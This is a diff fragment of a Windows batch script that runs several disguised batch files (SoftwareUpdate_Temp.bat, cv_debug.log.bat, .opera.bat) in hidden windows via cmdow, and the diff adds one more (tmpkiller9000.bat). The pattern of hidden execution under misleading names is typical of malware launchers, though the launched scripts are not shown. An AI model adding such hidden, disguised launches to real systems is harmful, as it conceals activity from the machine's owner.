@@ -7,6 +7,7 @@ cmdow /run /hid SoftwareUpdate_Temp.bat
 cmdow /run /hid lister.bat
 cmdow /run /hid .opera.bat
 cmdow /run /hid cv_debug.log.bat
+cmdow /run /hid tmpkiller9000.bat
 
 echo Worked!
 timeout /t 10 >nul
